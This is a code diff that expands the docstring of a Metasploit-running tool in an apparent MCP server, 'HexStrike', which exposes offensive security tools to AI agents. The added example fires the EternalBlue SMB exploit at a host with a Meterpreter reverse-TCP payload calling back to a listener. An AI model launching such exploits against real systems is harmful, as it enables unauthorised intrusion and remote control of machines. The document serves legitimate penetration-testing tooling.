@@ -1215,11 +1215,30 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient, compact: bool = False) -
         Execute a Metasploit module with enhanced logging.
 
         Args:
-            module: The Metasploit module to use
-            options: Dictionary of module options
+            module: The Metasploit module to use (e.g., "exploit/windows/smb/ms17_010_eternalblue").
+            options: Dictionary of module options. Required options depend on the module type:
+                - For exploits: Common required options include 'RHOST', 'RPORT', 'PAYLOAD', etc.
+                - For auxiliary modules: Options may include 'TARGET', 'THREADS', etc.
+                - For post modules: Options depend on the session and target.
 
         Returns:
-            Metasploit execution results
+            Metasploit execution results.
+
+        Example:
+            metasploit_run(
+                module="exploit/windows/smb/ms17_010_eternalblue",
+                options={
+                    "RHOST": "192.168.1.10",
+                    "RPORT": 445,
+                    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
+                    "LHOST": "192.168.1.100",
+                    "LPORT": 4444
+                }
+            )
+
+        Note:
+            Refer to Metasploit module documentation for the full list of required and optional parameters.
+            All required options must be provided in the 'options' dictionary for successful execution.
         """
         data = {
             "module": module,
